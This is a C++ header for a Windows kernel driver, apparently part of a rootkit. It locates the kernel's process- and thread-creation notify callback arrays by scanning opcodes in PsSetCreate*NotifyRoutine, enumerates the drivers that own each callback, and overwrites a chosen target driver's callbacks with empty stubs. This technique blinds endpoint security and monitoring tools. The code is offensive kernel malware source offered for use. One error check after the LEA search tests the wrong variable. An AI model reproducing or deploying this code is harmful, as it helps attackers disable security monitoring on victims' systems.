#pragma once

#include <ntifs.h>
#include <wdf.h>
#include "Globals.hpp"
#include "WinTypes.hpp"
#include "MemoryUtils.hpp"

/**
 * Enumerates loaded drivers by parsing the driver section inloadorder linked list
 */
VOID
BeEnumerateDrivers()
{
    PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)(BeGlobals::diskDriverObject)->DriverSection;
    PKLDR_DATA_TABLE_ENTRY first = entry;

    while ((PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink != first)
    {
		// LOG_MSG("Driver: 0x%llx :: %ls\r\n", entry->DllBase, entry->BaseDllName.Buffer);
        entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
    }
}

/**
 * Returns the driver that contains the address passed as an argument
 * 
 * @param address Address to look up
 * @return PKLDR_DATA_TABLE_ENTRY driver that contanis the address
 */
PKLDR_DATA_TABLE_ENTRY
BeGetDriverForAddress(UINT64 address)
{
	PKLDR_DATA_TABLE_ENTRY entry = (PKLDR_DATA_TABLE_ENTRY)(BeGlobals::diskDriverObject)->DriverSection;

	LOG_MSG("Looking for address: 0x%llx\r\n", address);

	for (auto i=0; i<512; ++i) // TODO: dirty hack to avoid bug
	{
		UINT64 startAddr = UINT64(entry->DllBase);
		UINT64 endAddr = startAddr + UINT64(entry->SizeOfImage);
		LOG_MSG("Looking for: %ls 0x%llx 0x%llx\r\n", entry->BaseDllName.Buffer, startAddr, endAddr);
		if (address >= startAddr && address < endAddr)
		{
			return (PKLDR_DATA_TABLE_ENTRY)entry;
		}
		entry = (PKLDR_DATA_TABLE_ENTRY)entry->InLoadOrderLinks.Flink;
	}

	return NULL;
}

/**
 * Gets the address of the array where kernel callbacks are stored
 * 1) Resolve the private Psp* routine from the Ps* routine by looking for CALL or JMP instructions
 * 2) Resolve the array of callbacks from the Psp* routine by looking for LEA r13 or LEA rcx instructions
 * 
 * @param type Type of callback to resolve
 * @return UINT64 address of the callbackRoutine array
 */
UINT64
BeGetKernelCallbackArrayAddr(CALLBACK_TYPE type)
{
	BeEnumerateDrivers();
	CHAR* callbackRoutineName;

	switch (type)
	{
	case CreateProcessNotifyRoutine:
		callbackRoutineName = "PsSetCreateProcessNotifyRoutine"; 
		break;
	case CreateThreadNotifyRoutine:
		callbackRoutineName = "PsSetCreateThreadNotifyRoutine";
		break;
	default:
		LOG_MSG("Unsupported callback type\r\n");
		return NULL;
	}

	UINT64 callbackRoutineAddr = 0;
	UINT64 psp_callbackRoutineAddr = 0;
	UINT64 callbackRoutineArrayAddr = 0;

	if (type == CreateProcessNotifyRoutine || type == CreateThreadNotifyRoutine)
	{
		// Resolve PsSetCreateXYZNotifyRoutine 
		callbackRoutineAddr = (DWORD64)BeGetSystemRoutineAddress(NtOsKrnl, callbackRoutineName);

		if (!callbackRoutineAddr)
		{
			LOG_MSG("Failed to resolve set-notify routine\r\n");
			return NULL;
		}

		// Now resolve PspSetCreateXYZNotifyRoutine
		// we look for CALL/JMP PspSetCreateXYZNotifyRoutine in the function assembly
		for (INT i = 0; i < 500; ++i)
		{
			if ((*(BYTE*)(callbackRoutineAddr + i) == ASM_CALL_NEAR)
				|| (*(BYTE*)(callbackRoutineAddr + i) == ASM_JMP_NEAR))
			{
				// param for CALL is offset to our routine
				LOG_MSG("Offset: 0x%llx\r\n", *(PUINT32*)(callbackRoutineAddr + i + 1));
				UINT32 offset = *(PUINT32)(callbackRoutineAddr + i + 1);
				// add offset to addr of next instruction to get psp address
				psp_callbackRoutineAddr = callbackRoutineAddr + i + offset + 5;
				break;
			}
		}

		if (!psp_callbackRoutineAddr)
		{
			LOG_MSG("Failed to resolve private setnotify routine\r\n");
			return NULL;
		}

		LOG_MSG("Private (psp) NotifyRoutine: 0x%llx\r\n", psp_callbackRoutineAddr);

		// Now we resolve the array of callbacks
		// we look for LEA r13 or LEA rcx <addr of callbackArray>
		for (INT i = 0; i < 500; ++i)
		{
			if ((*(BYTE*)(psp_callbackRoutineAddr + i) == ASM_LEA_R13_BYTE1 && *(BYTE*)(psp_callbackRoutineAddr + i + 1) == ASM_LEA_R13_BYTE2)
				|| (*(BYTE*)(psp_callbackRoutineAddr + i) == ASM_LEA_RCX_BYTE1 && *(BYTE*)(psp_callbackRoutineAddr + i + 1) == ASM_LEA_RCX_BYTE2))
			{
				// param for LEA is the address of the callback array
				UINT32 offset = *(PUINT32)(psp_callbackRoutineAddr + i + 3);
				// add ofset to next instruction to get callback array addr
				callbackRoutineArrayAddr = psp_callbackRoutineAddr + i + offset + 7;
				break;
			}
		}

		if (!psp_callbackRoutineAddr)
		{
			LOG_MSG("Failed to resolve Array for callbacks\r\n");
			return NULL;
		}

		return callbackRoutineArrayAddr;
	}

	return NULL;
}

/**
 * Enumerates kernel callbacks set 
 * 
 * @param type Type of callback to resolve
 * @returns ktd::vector<KernelCallback, PagedPool> Vector of callbacks
 */
ktd::vector<CALLBACK_DATA, PagedPool>
BeEnumerateKernelCallbacks(CALLBACK_TYPE type)
{
	auto data = ktd::vector<CALLBACK_DATA, PagedPool>();

	// get address for the kernel callback array
	auto arrayAddr = BeGetKernelCallbackArrayAddr(type);
	if (!arrayAddr)
	{
		LOG_MSG("Failed to get array addr for kernel callbacks\r\n");
		return data;
	}
	LOG_MSG("Array for callbacks: 0x%llx\r\n", arrayAddr);

	for (INT i = 0; i < 16; ++i) // TODO: max number
	{
		// get current address & align the addresses to 0x10 (https://medium.com/@yardenshafir2/windbg-the-fun-way-part-2-7a904cba5435)
		PVOID currCallbackBlockAddr = (PVOID)(((UINT64*)arrayAddr)[i] & 0xFFFFFFFFFFFFFFF0);

		if (!currCallbackBlockAddr)
			continue;

		// cast to callback routine block
		auto currCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)currCallbackBlockAddr);

		// get function address
		auto callbackFunctionAddr = (UINT64)currCallbackBlock.Function;

		// get corresponding driver
		auto driver = BeGetDriverForAddress(callbackFunctionAddr);

		// If unbacked memory with no associated driver
		if (driver == NULL)
		{
			// Print info
			LOG_MSG("Callback: <Unbacked Memory>, 0x%llx\r\n", callbackFunctionAddr);

			// create result struct
			CALLBACK_DATA pcc = {
				0,
				callbackFunctionAddr,
				NULL
			};
			PWCH pwsUnbacked = L"Unbacked";
			memcpy(pcc.driverName, pwsUnbacked, (wcslen(pwsUnbacked) + 1) * sizeof(WCHAR));

			// add to results
			data.push_back(pcc);
		}
		else
		{
			// calculate offset of function
			auto offset = callbackFunctionAddr - (UINT64)(driver->DllBase);

			// Print info
			LOG_MSG("Callback: %ls, 0x%llx + 0x%llx\r\n", driver->BaseDllName.Buffer, (UINT64)driver->DllBase, offset);

			// create result struct
			CALLBACK_DATA pcc = {
				(UINT64)driver->DllBase,
				offset,
				NULL
			};
			memcpy(pcc.driverName, driver->BaseDllName.Buffer, (wcslen(driver->BaseDllName.Buffer) + 1) * sizeof(WCHAR));

			// add to results
			data.push_back(pcc);
		}
	}

	return data;
}


/**
 * Empty callback routine to be used for replacing other kernel callback routines with any code that you want to run.
 */
VOID
BeEmptyCreateProcessNotifyRoutine(
	IN HANDLE ParentId,
	IN HANDLE ProcessId,
	IN BOOLEAN Create
)
{
	UNREFERENCED_PARAMETER(ParentId);
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(Create);

	AutoLock<FastMutex> _lock(BeGlobals::callbackLock);

	LOG_MSG("Empty CreateProcessNotifyRoutine called\n");
}

/**
 * Empty callback routine to be used for replacing other kernel callback routines with any code that you want to run.
 */
VOID
BeEmptyCreateThreadNotifyRoutine(
	IN HANDLE ProcessId,
	IN HANDLE ThreadId,
	IN BOOLEAN Create
)
{
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(ThreadId);
	UNREFERENCED_PARAMETER(Create);

	AutoLock<FastMutex> _lock(BeGlobals::callbackLock);

	LOG_MSG("Empty CreateThreadNotifyRoutine called\n");
}

/**
 *
 */
NTSTATUS
BeReplaceKernelCallbacksOfDriver(PWCH targetDriverModuleName, CALLBACK_TYPE type)
{
	LOG_MSG("Target: %S\n", targetDriverModuleName);

	// get address for the kernel callback array
	auto arrayAddr = BeGetKernelCallbackArrayAddr(type);
	if (!arrayAddr)
	{
		LOG_MSG("Failed to get array addr for kernel callbacks\r\n");
		return STATUS_NOT_FOUND;
	}
	LOG_MSG("Array for callbacks: 0x%llx\r\n", arrayAddr);

	for (INT i = 0; i < 16; ++i) // TODO: max number
	{
		// get callback array address & align the addresses to 0x10 (https://medium.com/@yardenshafir2/windbg-the-fun-way-part-2-7a904cba5435)
		auto currCallbackBlockAddr = (PVOID)(((UINT64*)arrayAddr)[i] & 0xFFFFFFFFFFFFFFF0);

		if (!currCallbackBlockAddr)
			continue;

		// cast to callback routine block
		auto currCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)currCallbackBlockAddr);

		// get function address
		auto callbackFunctionAddr = (UINT64)currCallbackBlock.Function;

		// get corresponding driver
		auto driver = BeGetDriverForAddress(callbackFunctionAddr);

		if (!driver)
		{
			LOG_MSG("Didnt find driver for callback\r\n");
			continue;
		}

		// if it is the driver were looking for
		if (wcscmp(driver->BaseDllName.Buffer, targetDriverModuleName) == 0)
		{
			// calculate offset of function
			auto offset = callbackFunctionAddr - (UINT64)(driver->DllBase);

			// Print info
			LOG_MSG("Replacing callback with empty callback: %ls, 0x%llx + 0x%llx\r\n", driver->BaseDllName.Buffer, (UINT64)driver->DllBase, offset);
			
			auto addrOfCallbackFunction = (ULONG64)currCallbackBlockAddr + sizeof(ULONG_PTR);

			{ 
				AutoLock<FastMutex> _lock(BeGlobals::callbackLock);
				LONG64 oldCallbackAddress;

				// Replace routine by empty routine
				switch (type)
				{
				case CreateProcessNotifyRoutine:
					oldCallbackAddress = InterlockedExchange64((LONG64*)addrOfCallbackFunction, (LONG64)&BeEmptyCreateProcessNotifyRoutine); 
					break;
				case CreateThreadNotifyRoutine:
					oldCallbackAddress = InterlockedExchange64((LONG64*)addrOfCallbackFunction, (LONG64)&BeEmptyCreateThreadNotifyRoutine);
					break;
				default:
					LOG_MSG("Invalid callback type\r\n");
					return STATUS_INVALID_PARAMETER;
					break;
				}

				// save old callback to restore later upon unloading
				BeGlobals::beCallbacksToRestore.addrOfCallbackFunction[BeGlobals::beCallbacksToRestore.length] = addrOfCallbackFunction;
				BeGlobals::beCallbacksToRestore.callbackToRestore[BeGlobals::beCallbacksToRestore.length] = oldCallbackAddress;
				BeGlobals::beCallbacksToRestore.callbackType[BeGlobals::beCallbacksToRestore.length] = type;
				BeGlobals::beCallbacksToRestore.length++;
			} 
		}
	}

	LOG_MSG("Kernel callbacks erased: %i\n", BeGlobals::beCallbacksToRestore.length);

	return STATUS_SUCCESS;
}